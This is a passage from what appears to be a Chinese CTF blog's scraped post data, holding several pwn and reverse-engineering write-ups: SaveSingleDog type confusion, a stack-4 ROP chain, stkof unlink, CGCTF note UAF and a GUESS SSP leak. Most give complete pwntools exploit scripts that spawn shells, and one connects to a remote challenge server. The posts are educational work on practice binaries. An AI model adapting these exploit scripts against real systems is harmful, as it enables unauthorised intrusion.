（看了wp之后）跟踪发现这里有一个cmp eax,0x4的操作，simpower91后输入的字符长度为4。 1234567891011121300493FA6 . 55 push ebp 00493FA7 . 68 BA414900 push crackme2.004941BA 00493FAC . 64:FF30 push dword ptr fs:[eax] 00493FAF . 64:8920 mov dword ptr fs:[eax],esp 00493FB2 . 8B45 EC mov eax,dword ptr ss:[ebp-0x14] 00493FB5 . E8 7A07F7FF call crackme2.00404734 00493FBA . 83F8 04 cmp eax,0x4 00493FBD . 0F85 BE010000 jnz crackme2.00494181 00493FC3 . EB 21 jmp short crackme2.00493FE6 00493FC5 .^ E0 B0 loopdne short crackme2.00493F77 00493FC7 . B1 B2 mov cl,0xB2``` 一路跟踪跟进了虚拟机函数，对四个字符的验证为`ord(i)+0x7f==[0xe0, 0xb0, 0xb1, 0xb2]`后四个字符为`a123`# SaveSingleDog听完人人人师傅的讲解豁然开朗，这题属于类型混淆，关键在于利用singledog和luckydog的不同结构及操作。main函数： puts(“This is a little game\\n”); puts(“You can create a character and choose if he needs a partner.\\n”); while ( 1 ) { menu(“You can create a character and choose if he needs a partner.\\n”, argv); read_int(); switch ( (unsigned int)&amp;savedregs ) { case 1u: singledog(); break; case 2u: luckydog(); break; case 3u: edit_singledog(); break; case 4u: edit_luckydog(); break; case 5u: save_singledog(); break; case 6u: exit(1); return; default: continue; } }1234常见的menu，有五个功能可以选择。其中，singledog(): v3 = readfsqword(0x28u); v2 = single_num; if ( single_num == 80 ) { puts(“full”); } else { printf(“Number :%d\\n”, (unsigned int)single_num); buf = malloc(0x20uLL); puts(“Name:”); read(0, buf, 0x20uLL); two[v2] = buf; ++single_num; } return readfsqword(0x28u) ^ v3;12luckydog: v4 = readfsqword(0x28u); v3 = lucky_num; if ( lucky_num == 80 ) { puts(“full”); } else { printf(“Number :%d\\n”, (unsigned int)lucky_num); v0 = malloc(0x20uLL); buf = malloc(0x20uLL); *v0 = buf; puts(“Name”); read(0, v0 + 1, 0x18uLL); puts(“your partner’s name”); read(0, buf, 0x20uLL); one[v3] = v0; ++lucky_num; } return readfsqword(0x28u) ^ v4;12可以对比两个dog之间的不同，singledog中的two存放的是一级指针，指向的地址存放着0x20长度的name，而luckydog中的one存放的是二级指针v0,v0指向的是buf的地址，buf指向的是partner&apos;s name，同时还有一个0x18长度的name，结构可以表示为： singledog: two[v2]: buf --&gt; name luckydog: one[v3]: v0 --&gt; buf --&gt; name v0+1 --&gt; partner&apos;s name 123buf占0x20的空间，v0占0x8的空间，v0+1占0x18的空间。在edit时，没有对one或two的越界检查，而且在one和two的存放方式如下： .data:0000000000202008 public dso_handle.data:0000000000202008 dso_handle dq offset dso_handle ; DATA XREF: do_global_dtors_aux+17↑r.data:0000000000202008 ; .data:dso_handle↓o.data:0000000000202008 _data ends.data:0000000000202008LOAD:0000000000202010 ; ===========================================================================LOAD:0000000000202010LOAD:0000000000202010 ; Segment type: Pure dataLOAD:0000000000202010 ; Segment permissions: Read/WriteLOAD:0000000000202010 LOAD segment byte public ‘DATA’ use64LOAD:0000000000202010 assume cs:LOADLOAD:0000000000202010 ;org 202010hLOAD:0000000000202010 public bss_startLOAD:0000000000202010 bss_start db ? ; ; DATA XREF: deregister_tm_clones↑oLOAD:0000000000202010 ; register_tm_clones↑o …LOAD:0000000000202010 ; Alternative name is ‘_edata’LOAD:0000000000202010 ; TMC_END__LOAD:0000000000202010 ; _edataLOAD:0000000000202011 db ? ;LOAD:0000000000202012 db ? ;LOAD:0000000000202013 db ? ;LOAD:0000000000202014 db ? ;LOAD:0000000000202015 db ? ;LOAD:0000000000202016 db ? ;LOAD:0000000000202017 unk_202017 db ? ; ; DATA XREF: deregister_tm_clones+7↑oLOAD:0000000000202018 db ? ;LOAD:0000000000202019 db ? ;LOAD:000000000020201A db ? ;LOAD:000000000020201B db ? ;LOAD:000000000020201C db ? ;LOAD:000000000020201D db ? ;LOAD:000000000020201E db ? ;LOAD:000000000020201F db ? ;LOAD:000000000020201F LOAD endsLOAD:000000000020201F.bss:0000000000202020 ; ===========================================================================.bss:0000000000202020.bss:0000000000202020 ; Segment type: Uninitialized.bss:0000000000202020 ; Segment permissions: Read/Write.bss:0000000000202020 ; Segment alignment ‘32byte’ can not be represented in assembly.bss:0000000000202020 _bss segment para public ‘BSS’ use64.bss:0000000000202020 assume cs:_bss.bss:0000000000202020 ;org 202020h.bss:0000000000202020 assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing.bss:0000000000202020 public stdout@@GLIBC_2_2_5.bss:0000000000202020 ; FILE stdout.bss:0000000000202020 stdout@@GLIBC_2_2_5 dq ? ; DATA XREF: LOAD:0000000000000490↑o.bss:0000000000202020 ; my_init+54↑r.bss:0000000000202020 ; Alternative name is ‘stdout’.bss:0000000000202020 ; Copy of shared data.bss:0000000000202028 align 10h.bss:0000000000202030 public stdin@@GLIBC_2_2_5.bss:0000000000202030 ; FILE stdin.bss:0000000000202030 stdin@@GLIBC_2_2_5 dq ? ; DATA XREF: LOAD:00000000000004A8↑o.bss:0000000000202030 ; my_init+36↑r.bss:0000000000202030 ; Alternative name is ‘stdin’.bss:0000000000202030 ; Copy of shared data.bss:0000000000202038 align 20h.bss:0000000000202040 public stderr@@GLIBC_2_2_5.bss:0000000000202040 ; FILE *stderr.bss:0000000000202040 stderr@@GLIBC_2_2_5 dq ? ; DATA XREF: LOAD:00000000000004C0↑o.bss:0000000000202040 ; my_init+72↑r.bss:0000000000202040 ; Alternative name is ‘stderr’.bss:0000000000202040 ; Copy of shared data.bss:0000000000202048 completed_6962 db ? ; DATA XREF: do_global_dtors_aux↑r.bss:0000000000202048 ; do_global_dtors_aux+29↑w.bss:0000000000202049 align 4.bss:000000000020204C public single_num.bss:000000000020204C single_num dd ? ; DATA XREF: singledog+17↑r.bss:000000000020204C ; singledog+9B↑r ….bss:0000000000202050 public lucky_num.bss:0000000000202050 lucky_num dd ? ; DATA XREF: luckydog+17↑r.bss:0000000000202050 ; luckydog+E2↑r ….bss:0000000000202054 align 20h.bss:0000000000202060 public two.bss:0000000000202060 ; _QWORD two[80].bss:0000000000202060 two dq 50h dup(?) ; DATA XREF: singledog+8C↑o.bss:0000000000202060 ; edit_singledog+3D↑o ….bss:00000000002022E0 public one.bss:00000000002022E0 ; _QWORD one[80].bss:00000000002022E0 one dq 50h dup(?) ; DATA XREF: luckydog+D3↑o.bss:00000000002022E0 ; edit_luckydog+3D↑o ….bss:00000000002022E0 _bss ends1234因此在`edit_singledog`时，可以利用越界的下标，把luckydog当做singledog进行edit。edit_singledog： v2 = readfsqword(0x28u); puts(“which?”); v1 = read_int(“which?”); if ( two[v1] ) { puts(“Oh,singledog,changing your name can bring you good luck.”); read(0, (void *)two[v1], 0x20uLL); printf(“new name: %s”, two[v1]); } else { puts(“nothing here”); } return readfsqword(0x28u) ^ v2;12由于之前的结构差异，此时会输出的是buf的地址，即之前申请的堆地址，但是最低的一个字节是被我们edit过的，但是因为取的是堆基址，所以无关紧要。堆地址是页对齐的，一页的大小为4k，所以`&amp;0xfffffffff000`取堆的基地址。 edit_single((0x2e0-0x60)/8,”\\x00”)io.recvuntil(“new name: “)heap_base = (u64(io.recv(6).ljust(8,’\\x00’))&amp;0xfffffffff000)1类似地，可以使用负数作为下标，leak出`__dso_handle`的值，同时`__dso_handle`的值就是它的地址，所以可以得到程序的基地址。 edit_single((0x08-0x60)/8,”\\x08”)io.recvuntil(“new name: “)proc_base = (u64(io.recv(6).ljust(8,’\\x00’))-0x202008)12之后就可以`edit_singledog`把luckydog中的buf改为two[0]，这样再次`edit_luckydog`时，就能修改two[0]为bss段的`stderr`地址，之后再次`edit_singledog`，就能leak出`stderr`地址。 edit_single((0x2e0-0x60)/8,p64(proc_base+elf.sym[‘two’]))edit_lucky(0,”**“,p64(proc_base+elf.sym[‘stderr’]))edit_single(0,”\\x80”)io.recvuntil(“new name: “)libc_base = (u64(io.recv(6).ljust(8,’\\x00’)))-libc.sym[‘_IO_2_1_stderr_’]12345关于libc的版本，出题人说可以尝试摸索发现程序存在tcache机制，随后判断libc版本为2.26或2.27，不过我现在对tcache还不是很了解……之后再次类似地将luckydog中的buf改为freehook的地址，修改freehook为system函数，再想办法让free时参数为/bin/sh即可。exp(照抄人人人师傅)： from pwn import *elf = ELF(“./apwn.dms”)libc = ELF(“/lib/x86_64-linux-gnu/libc-2.27.so”)io = process(“./apwn.dms”,env={“LD_PRELOAD”:”/lib/x86_64-linux-gnu/libc-2.27.so”})def choice(c): io.sendlineafter(“&gt;&gt;\\n”,str(c))def single(name): choice(1) io.sendafter(“Name:\\n”,name)def lucky(name,cp_name): choice(2) io.sendafter(“Name\\n”,name) io.sendafter(“your partner’s name\\n”,cp_name)def edit_single(idx,new_name): choice(3) io.sendlineafter(“which?”,str(idx)) io.sendafter(“Oh,singledog,changing your name can bring you good luck.\\n”,new_name)def edit_lucky(idx,new_name,new_cp_name): choice(4) io.sendlineafter(“which?”,str(idx)) io.sendafter(“Oh,luckydog,What is your new name?\\n”,new_name) io.sendafter(“your partner’s new name\\n”,new_cp_name)def save_single(): choice(5) lucky(“0000”,”0001”)single(“0000”) edit_single((0x2e0-0x60)/8,”\\x00”)io.recvuntil(“new name: “)heap_base = (u64(io.recv(6).ljust(8,’\\x00’))&amp;0xfffffffff000)success(“HEAP BASE -&gt; %#x”%heap_base) edit_single((0x08-0x60)/8,”\\x08”)io.recvuntil(“new name: “)proc_base = (u64(io.recv(6).ljust(8,’\\x00’))-0x202008)success(“PROC BASE -&gt; %#x”%proc_base) edit_single((0x2e0-0x60)/8,p64(proc_base+elf.sym[‘two’]))edit_lucky(0,”**“,p64(proc_base+elf.sym[‘stderr’]))edit_single(0,”\\x80”)io.recvuntil(“new name: “)libc_base = (u64(io.recv(6).ljust(8,’\\x00’)))-libc.sym[‘_IO_2_1_stderr_’]success(“LIBC BASE -&gt; %#x”%libc_base) edit_lucky(0,”echo X;/bin/sh\\x00”,p64(libc_base+libc.sym[‘__free_hook’]))edit_single(0,p64(libc_base+libc.sym[‘system’]))lucky(“/bin/sh\\x00”,”/bin/sh\\x00”)save_single()io.interactive()`","categories":[],"tags":[]},{"title":"某stack-4","slug":"某stack-4","date":"2019-03-19T14:45:19.000Z","updated":"2019-03-19T15:13:09.663Z","comments":true,"path":"2019/03/19/某stack-4/","link":"","permalink":"http://yoursite.com/2019/03/19/某stack-4/","excerpt":"一道静态编译的栈题，利用ROPgadget构造ropchain。","text":"一道静态编译的栈题，利用ROPgadget构造ropchain。 只开了NX保护。 可以发现如果v6的值也就是计算次数足够大的时候，使用功能5就可以产生栈溢出，但是要注意的是这里ida显示的v5的地址是ebp-0x34，但事实上调试来看，这个地址是错误的。 这里可以看见ebp的地址是FF80A888，我调试时输入的计算结果3次都是0xA0，可以知道v5的地址是FF80A84C，是ebp-0x3c,所以覆盖到返回地址所需要的偏移为0x3c+4，覆盖所需要的计算次数是16次。 为了获取shell，使用了ROPgadget生成rop链。 ROPgadget --binary stack-4. ropchain 因为这个程序构造ropchain只能四个字节四个字节地构造，所以把ropgadget提供的ropchain拆解一下，自己手动构造，需要注意的是’/bin’和’//sh’转换成数字时需要注意大小端序。 123&apos;nib/&apos;=0x6e69622f&apos;hs//&apos;=0x68732f2fp=[0x0806ed0a,0x080ea060,0x080bb406,0x6e69622f,0x080a1dad,0x0806ed0a,0x080ea064,0x080bb406,0x68732f2f,0x080a1dad,0x0806ed0a,0x080ea068,0x08054730,0x080a1dad,0x080481c9,0x080ea060,0x0806ed31,0x080ea068,0x080ea060,0x0806ed0a,0x080ea068,0x08054730,0x0807b75f,0x0807b75f,0x0807b75f,0x0807b75f,0x0807b75f,0x0807b75f,0x0807b75f,0x0807b75f,0x0807b75f,0x0807b75f,0x0807b75f,0x08049781] 另外由于完成构造后还需要进行计算一次才能完成覆盖，所以计算次数为16+len(p)+1。 最终脚本： 1234567891011121314151617181920212223from pwn import *sh=process(&apos;./stack-4.&apos;)elf=ELF(&apos;./stack-4.&apos;)p=[0x0806ed0a,0x080ea060,0x080bb406,0x6e69622f,0x080a1dad,0x0806ed0a,0x080ea064,0x080bb406,0x68732f2f,0x080a1dad,0x0806ed0a,0x080ea068,0x08054730,0x080a1dad,0x080481c9,0x080ea060,0x0806ed31,0x080ea068,0x080ea060,0x0806ed0a,0x080ea068,0x08054730,0x0807b75f,0x0807b75f,0x0807b75f,0x0807b75f,0x0807b75f,0x0807b75f,0x0807b75f,0x0807b75f,0x0807b75f,0x0807b75f,0x0807b75f,0x08049781]sh.recvuntil(&quot;calculate:&quot;)sh.sendline(str(16+len(p)+1))for i in range(16): sh.recvuntil(&quot;result\\n&quot;) sh.sendline(&quot;1&quot;) sh.recvuntil(&quot;:&quot;) sh.sendline(&quot;0&quot;) sh.recvuntil(&quot;:&quot;) sh.sendline(&apos;0&apos;)for i in range(len(p)): sh.recvuntil(&quot;result\\n&quot;) sh.sendline(&quot;1&quot;) sh.recvuntil(&quot;:&quot;) sh.sendline(&quot;0&quot;) sh.recvuntil(&quot;:&quot;) sh.sendline(str(p[i]))sh.recvuntil(&apos;result\\n&apos;)sh.sendline(&apos;5&apos;)sh.interactive()","categories":[],"tags":[]},{"title":"2014 HITCON stkof","slug":"2014-HITCON-stkof","date":"2019-03-19T02:41:13.000Z","updated":"2019-03-23T02:34:30.732Z","comments":true,"path":"2019/03/19/2014-HITCON-stkof/","link":"","permalink":"http://yoursite.com/2019/03/19/2014-HITCON-stkof/","excerpt":"一道简单的unlink题，CTFWIKI上解释的很清楚。","text":"一道简单的unlink题，CTFWIKI上解释的很清楚。 运行程序发现没有任何提示性文字，只能直接ida分析了。 输入1，malloc一个自己指定大小但有限制的空间，并把这个空间的首地址存在bss段的0x602140上的s数组里。 输入2，可以编辑*s[i]，并且此处有溢出。 输入3，可以free掉s[i]，free后指针置零，不存在UAF。 输入4，调用一个没什么用的函数，输出\\\\TODO或...。 由于程序本身没有进行 setbuf 操作，所以在执行输入输出操作的时候会申请缓冲区。为了防止对之后的操作产生影响，可以先输入1执行一次，把缓冲区先申请完毕再进行操作。 首先分配三个chunk： 1add(0x100) 完成申请缓冲区 add(0x30) 修改这个chunk来覆盖下一个chunk add(0x80) free这个chunk完成unlink 进行unlik： 12payload=p64(0)+p64(0x30)+p64(s+16-0x18)+p64(s+16-0x10)+p64(0)+p64(0)+p64(0x30)+p64(0x90)edit(2,len(payload),payload) delete(3) edit完之后修改的chunk为： 10x0000000000000000 0x0000000000000030 0x0000000000602138 0x0000000000602140 0x0000000000000000 0x0000000000000000 0x0000000000000030 0x0000000000000090 此时free下一个chunk，就会向前与刚刚修改的chunk合并。 同时： 12*(fakeFD + 0x18) = fakeBK*(fakeBK + 0x10) = fakeFD 最终效果就是*(0x602150)==0x602138 此时s[2]=&amp;s[0],edit(2)就可以对s[0]进行更改： 1payload = &apos;a&apos; * 8 + p64(elf.got[&apos;free&apos;]) + p64(elf.got[&apos;puts&apos;]) + p64(elf.got[&apos;atoi&apos;]) edit(2, len(payload), payload) 再edit(1)就可以修改free的got表： 1payload = p64(elf.plt[&apos;puts&apos;]) edit(0, len(payload), payload) 现在调用free时实际调用的就是puts。 1sh.sendline(&apos;3&apos;) sh.sendline(&apos;1&apos;) puts_add=u64(sh.recv()[:6]+&apos;\\x00\\x00&apos;) libc_base=puts_add-0x06f690 这样就可以leak出libc基址（由于没有给libc文件，我事先leak了两个函数地址自己找了libc版本。） 根据偏移得到system函数地址，并修改atoi的got表： 1system=libc_base+0x045390 edit(2,8,p64(system)) 现在调用atoi时实际调用的就是system。 程序在选择功能时就会调用atoi，并且参数可以任意输入，输入/bin/sh\\x00就可以获取shell。 最终脚本： 1from pwn import * sh=process(&apos;heap-1.&apos;) elf=ELF(&apos;heap-1.&apos;) def add(size): sh.sendline(&apos;1&apos;) sh.sendline(str(size)) sh.recvuntil(&apos;OK\\n&apos;) def edit(index, size, content): sh.sendline(&apos;2&apos;) sh.sendline(str(index)) sh.sendline(str(size)) sh.send(content) sh.recvuntil(&apos;OK\\n&apos;) def delete(index): sh.sendline(&apos;3&apos;) sh.sendline(str(index)) sh.recvuntil(&apos;OK\\n&apos;) s=0x602140 add(0x100) add(0x30) add(0x80) payload=p64(0)+p64(0x30)+p64(s+16-0x18)+p64(s+16-0x10)+p64(0)+p64(0)+p64(0x30)+p64(0x90) edit(2,len(payload),payload) delete(3) payload = &apos;a&apos; * 8 + p64(elf.got[&apos;free&apos;]) + p64(elf.got[&apos;puts&apos;]) + p64(elf.got[&apos;atoi&apos;]) edit(2, len(payload), payload) payload = p64(elf.plt[&apos;puts&apos;]) edit(0, len(payload), payload) sh.sendline(&apos;3&apos;) sh.sendline(&apos;1&apos;) puts_add=u64(sh.recv()[:6]+&apos;\\x00\\x00&apos;) libc_base=puts_add-0x06f690 system=libc_base+0x045390 edit(2,8,p64(system)) sh.sendline(&apos;/bin/sh\\x00&apos;) sh.interactive()","categories":[],"tags":[]},{"title":"CONFidence2019-oldschool","slug":"CONFidence2019-oldschool","date":"2019-03-17T11:17:47.000Z","updated":"2019-03-17T11:52:46.130Z","comments":true,"path":"2019/03/17/CONFidence2019-oldschool/","link":"","permalink":"http://yoursite.com/2019/03/17/CONFidence2019-oldschool/","excerpt":"一道8086汇编题。","text":"一道8086汇编题。 不知道还会开放多久的比赛地址。 运行一波程序，结合汇编进行分析，8086汇编不是很会，看了很久才看出程序大概是个什么逻辑。 程序一开始会让我们输入，输入的字符仅限于十六进制中存在的字符。当输入到达18个时就会终止输入并开始输出，同时题目给了我们一个flag.txt，里面的字符跟输出的是差不多的。所以猜测我们输入正确的flag就会打印出和flag.txt中一样的内容。 flag.txt的内容： 12345 4 &#123;4pp p &#123;k4&#123; E p 44p&#123; p 4 p S 又读了很久汇编后，发现输出的字符是以seg000:000~0a1的值为index，对p4{krule_ctf}取值输出的。 不妨对flag.txt的内容进行替换一下。 12345 2 3211 1 3423 E 1 2213 1 2 1 S 仔细分析一下程序发现其实这是一个一笔画或者说迷宫，S是起点，E是终点。数字代表着要走到这个地方的次数，输入的每两位会控制走四步，并且只能斜着走，不过不会超过边界，例如从第一行的3的位置往右上走，只会往右移一格。 知道了规则之后就很简单了，手动走了一下得到了正确的输入，但是却不是正确的flag，阅读题目要求发现输入的ascii码转字符之后要满足p4{[0-9a-z]+}，所以开始3个最后一格ascii码值是固定的，中间的ascii码值也有范围要求。 以q代表向左上，w代表向右上，a代表向左下，s代表向右下，找到了一条满足要求的路径：qqswqwsqsaswwqawwqswwaawaqsqawawwssw 这条路径所需的输入为：70347b61716932667d 转字符串得到：p4{aqi2f} 一开始没有注意题目的要求，很久没能找到正确的flag，并且也不会编程根据这个图寻找flag，只能手动找路径。比赛结束了一会才找到（说不定正确）的flag，属实弟弟行为。","categories":[],"tags":[]},{"title":"CGCTF-note","slug":"CGCTF-note","date":"2019-03-13T15:19:00.000Z","updated":"2019-03-26T14:26:51.331Z","comments":true,"path":"2019/03/13/CGCTF-note/","link":"","permalink":"http://yoursite.com/2019/03/13/CGCTF-note/","excerpt":"入门堆题，没入门的我看了很久才弄出来。","text":"入门堆题，没入门的我看了很久才弄出来。 简单分析一个简单的note程序： 1234561.add2.show3.edit4.delete5.exitchoice&gt;&gt; 通过ida分析发现没有堆溢出，但是delete的时候指针没有置零，存在UAF。 开启了pie，所以大致思路是泄漏出libc的真实地址然后修改malloc_hook来执行onegadget。 泄漏libc真实地址先分配两个smallchunk，然后delete第一个，其fd和bk指针就会指向main_arena+88，此时因为UAF，使用show功能就可以得到main_arena+88的真实地址。 通过main_arena+88在libc文件中的偏移，就可以得到libc的真实基址。 修改malloc_hook在调用malloc函数时，程序会对malloc_hook进行检查，如果不为0，就会调用malloc_hook指向的函数，借此调用onegadget。 fastbin是一个单链表，其fd指针会指向下一个可分配的chunk。利用UAF修改掉最后并进fastbin中的chunk的fd指针，使其指向任意地址，这样之后第二次malloc出的chunk就会出现在任意地址上，从而实现任意地址写。 但是在malloc之前，程序会对要分配的地址进行检查，如果没有对应size的chunk，就不会在此处分配，所以要对这个地址进行构造，利用gdb查看内存了解如何构造。 最终exp1234567891011121314151617181920212223242526272829303132333435363738394041from pwn import *#sh=process(&quot;./note3&quot;)sh=remote(&quot;45.76.173.177&quot;,6666)elf=ELF(&quot;./note3&quot;)def add(size,content): sh.recvuntil(&quot;choice&gt;&gt;&quot;) sh.sendline(&quot;1&quot;) sh.recvuntil(&quot;Size:&quot;) sh.sendline(str(size)) sh.recvuntil(&quot;Content:&quot;) sh.sendline(content)def show(index): sh.recvuntil(&quot;choice&gt;&gt;&quot;) sh.sendline(&quot;2&quot;) sh.recvuntil(&quot;Index:&quot;) sh.sendline(str(index))def edit(index,content): sh.recvuntil(&quot;choice&gt;&gt;&quot;) sh.sendline(&quot;3&quot;) sh.recvuntil(&quot;Index:&quot;) sh.sendline(str(index)) sh.sendline(content)def delete(index): sh.recvuntil(&quot;choice&gt;&gt;&quot;) sh.sendline(&quot;4&quot;) sh.recvuntil(&quot;Index:&quot;) sh.sendline(str(index))add(136,&apos;aaaaaaaaabcdefgh&apos;)add(136,&apos;&apos;)delete(0)show(0)libc_base=u64(sh.recv(6).ljust(8,&apos;\\x00&apos;))-0x397b00-88onegadget=libc_base+0xd694fmalloc_hook=libc_base+0x397b00-0x10add(96,&apos;\\x22&apos;*16)delete(2)edit(2,p64(malloc_hook-0x23))add(96,&apos;&apos;)add(96,&apos;\\x00&apos;*19+p64(onegadget))sh.recvuntil(&quot;choice&gt;&gt;&quot;) sh.sendline(&quot;1&quot;) sh.recvuntil(&quot;Size:&quot;) sh.sendline(&apos;1&apos;)sh.interactive() 本地process会错误退出，但是remote的话就能成功拿到shell，不知道为啥呢orz","categories":[],"tags":[]},{"title":"调用64位代码的32位程序逆向","slug":"32位程序调用64位代码","date":"2019-03-11T16:43:20.000Z","updated":"2019-03-14T12:32:36.209Z","comments":true,"path":"2019/03/12/32位程序调用64位代码/","link":"","permalink":"http://yoursite.com/2019/03/12/32位程序调用64位代码/","excerpt":"教程","text":"教程 关于如何从32位程序中dump出64位函数，我就不赘述了，上面的文章已经说的很详尽了。 dump出的64位函数（大致意义上重命名了一些函数，可能有错误）： 对{}中内容的check是以方程组的形式，这里使用了z3求解得到答案： 1234567891011121314151617181920212223from z3 import *a1=[BitVec(&apos;a1%d&apos;%i,8) for i in range(11)]solver=Solver()solver.add(a1[4] ^ a1[2] ^ a1[6] == 119)solver.add((a1[1] ^ a1[0] ^ a1[3]) == 54)solver.add(a1[10] + a1[3] == 85)solver.add(a1[2] + a1[9] == 219)solver.add(a1[4] + a1[5] == 158)solver.add(a1[2] + a1[1] + a1[5] == 196)solver.add(a1[8] + a1[7] + a1[9] == 194)solver.add(a1[5] + a1[3] + a1[9] == 190)solver.add(a1[6] + a1[2] + a1[8] == 277)solver.add(a1[10] + a1[1] + a1[7] == 124)solver.add(a1[5] == 48)solver.add(a1[10] == 53)solver.add(a1[7] ^ a1[6] ^ a1[8] == 96)if solver.check() == sat: m = solver.model() s=[] for i in range(11): s.append(m[a1[i]].as_long())print &apos;&apos;.join([chr(i) for i in s])# 1&apos;m n0t 4n5 因为存在异或操作，所以定义变量时使用了BitVec。 1parallels@parallels-vm:~$ &apos;/home/parallels/64-32-1.&apos; input_code: hwbctf&#123;1&apos;m n0t 4n5&#125; you got it 做完了才发现这道题和最开始的链接里说的是一道题2333","categories":[],"tags":[]},{"title":"2018网鼎杯pwn-GUESS","slug":"2018网鼎杯pwn-GUESS","date":"2019-03-04T14:26:04.000Z","updated":"2019-03-04T15:19:04.079Z","comments":true,"path":"2019/03/04/2018网鼎杯pwn-GUESS/","link":"","permalink":"http://yoursite.com/2019/03/04/2018网鼎杯pwn-GUESS/","excerpt":"hint: libc基址泄露+flag泄露","text":"hint: libc基址泄露+flag泄露 开启了canary保护 IDA观察一波： 发现输入flag的地方有栈溢出，并且运行了一下发现一共可以输入3次，同时因为有fork的操作，所以即使第一次输入触发了canary，之后仍然可以进行第二第三次输入。 这里利用SSP Leak就可以泄漏libc基址和flag了。 触发canary后，程序会以%s输出__libc_main_argv[0]，可以通过栈溢出覆盖到这个位置的，从而泄漏出想要泄漏的东西。 使用gdb对程序进行调试，很方便就能得到该位置： __libc_main_argv[0]=0x7fffffffdde8 在gets函数后下断点，对栈进行观察，找到输入在栈中的位置： 这里我输入的是随便打的tyuio input=0x7fffffffdcc0 所以需要的填充为：0x7fffffffdde8-0x7fffffffdcc0=296 不知道libc版本的话，三次栈溢出貌似不太够用，所以我先泄漏了两个libc函数地址，手动找到了libc版本。 123456from pwn import * sh=process(&quot;./GUESS&quot;) elf=ELF(&quot;./GUESS&quot;) puts_got=elf.got[&quot;puts&quot;]start_got=elf.got[&quot;__libc_start_main&quot;]sh.recvuntil(&apos;Please type your guessing flag&apos;) sh.sendline(&quot;a&quot;*296+p64(puts_got)) sh.recvuntil(&apos;*** stack smashing detected ***: &apos;) puts_add=u64(sh.recv(6)+&quot;\\x00\\x00&quot;)print hex(puts_add)sh.recvuntil(&apos;Please type your guessing flag&apos;) sh.sendline(&quot;a&quot;*296+p64(start_got)) sh.recvuntil(&apos;*** stack smashing detected ***: &apos;) start_add=u64(sh.recv(6)+&quot;\\x00\\x00&quot;)print hex(start_add) 一开始接受地址的时候，recv了8个字节，结果出了问题，从上面的栈图中也可以发现，64位程序内存的地址貌似最多只有6个字节，因此接受6个字节，再加2个\\x00就可以了。 运行得到两个libc函数的地址： 通过网站在线查询可以得到libc版本（其实也可以用LibcSearcher这个库，但最近重装虚拟机还没弄好）： 得到基址：libc_base=puts_add-0x06f690 为了泄漏flag，还要知道栈的地址。 libc里有*environ指针指向栈地址，所以可以通过这个指针泄漏栈地址。 在刚刚的网站可以查到_environ与libc基址之间的偏移。 1environ_add=libc_base+0x3c6f38 sh.recvuntil(&apos;Please type your guessing flag&apos;) sh.sendline(&quot;a&quot;*296+p64(environ_add)) sh.recvuntil(&apos;*** stack smashing detected ***: &apos;) stack_add=u64(sh.recv(6)+&quot;\\x00\\x00&quot;) 得到了栈地址之后，只要知道flag在栈中的偏移，就可以泄漏flag。 通过gdb查看栈地址： 计算flag在栈中偏移： 0x7fffffffddf8-0x7fffffffdc90=360 最终exp： 1from pwn import * sh=process(&quot;./GUESS&quot;) elf=ELF(&quot;./GUESS&quot;) puts_got=elf.got[&quot;puts&quot;] sh.recvuntil(&apos;Please type your guessing flag&apos;) sh.sendline(&quot;a&quot;*296+p64(puts_got)) sh.recvuntil(&apos;*** stack smashing detected ***: &apos;) puts_add=u64(sh.recv(6)+&quot;\\x00\\x00&quot;) libc_base=puts_add-0x06f690 environ_add=libc_base+0x3c6f38 sh.recvuntil(&apos;Please type your guessing flag&apos;) sh.sendline(&quot;a&quot;*296+p64(environ_add)) sh.recvuntil(&apos;*** stack smashing detected ***: &apos;) stack_add=u64(sh.recv(6)+&quot;\\x00\\x00&quot;) sh.recvuntil(&apos;Please type your guessing flag&apos;) sh.sendline(&quot;a&quot;*296+p64(stack_add-360)) sh.recvuntil(&apos;*** stack smashing detected ***: &apos;) flag=sh.recvuntil(&quot;&#125;&quot;) print flag 运行结果： 1parallels@parallels-vm:~$ python guess.py [+] Starting local process &apos;./GUESS&apos;: pid 22240 [*] &apos;/home/parallels/GUESS&apos; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) [*] Process &apos;./GUESS&apos; stopped with exit code 0 (pid 22240) flag&#123;just4eriri&#125;","categories":[],"tags":[]},{"title":"安恒杯2019年2月月赛","slug":"安恒杯2019年2月月赛","date":"2019-02-24T10:02:04.000Z","updated":"2019-02-24T10:11:50.069Z","comments":true,"path":"2019/02/24/安恒杯2019年2月月赛/","link":"","permalink":"http://yoursite.com/2019/02/24/安恒杯2019年2月月赛/","excerpt":"鶸只写了crypto，misc，re各一道题orz","text":"鶸只写了crypto，misc，re各一道题orz cpp这题加密啥的倒是不难，就是要找比对的字符串有点不知道去哪找，除了一个“Please input:”就啥也找不到了。 后来从头再来了一遍，发现了奇怪的地方： “Please input:”上面有一个’g’和’0’，点进去看了一会发现一个函数比较后会打印’g00d’，一路按x往前，最后终于找到了需要比对的字符串“”access denieda””。 解密脚本： 123456789101112s=&quot;access denieda&quot;temp=[]for i in range(len(s)): temp.append(ord(s[i])^i)for i in range(len(temp)): if i%3==0: temp[i]^=0x1f if i%3==1: temp[i]^=0x20 if i%3==2: temp[i]^=0x21print &apos;&apos;.join([chr(i) for i in temp]) 解密出来的字符串也不是很明显…然而md5之后交了一下发现对了2333 hahaha题目下载了一个压缩包，提示需要密码。 发现压缩包里有4个6字节的txt和一个flag.pdf。 以前看过类似的题目，利用crc32爆破出txt的内容，就是压缩包的密码，然后解密得到flag.pdf： 看图可知需要继续爆破，把字符全排列一下，然后sha1后等于给的值就行了。 一开始沙雕了爆破了很久都没得到flag,后来才想起来flag应该是有格式的，所以shift键只能用在1或2上，加了格式之后秒出结果： 1234567891011121314151617181920import hashlibvisit = [True, True, True, True, True, True, True]temp = [&quot;&quot; for x in range(0, 7)]def dfs(position): if position == len(arr): string=&apos;&apos;.join(temp) flag=&quot;flag&#123;&quot;+string+&quot;&#125;&quot; if hashlib.sha1(flag).hexdigest()==&apos;e6079c5ce56e781a50f4bf853cdb5302e0d8f054&apos;: print flag return for index in range(0,len(arr)): if visit[index] == True: temp[position] = arr[index] visit[index] = False dfs(position + 1) visit[index] = True arr = [&quot;1&quot;,&quot;@&quot;,&apos;s&apos;,&apos;e&apos;,&apos;h&apos;,&apos;c&apos;,&apos;n&apos;]dfs(0) 来玩个游戏吧第一关一开始就知道是可以用网站解密的了,然而想了半天不知道该怎么把那个盲文拖下来orz。 后来拖下来之后解压出了一个32位字符串,前两位是??。 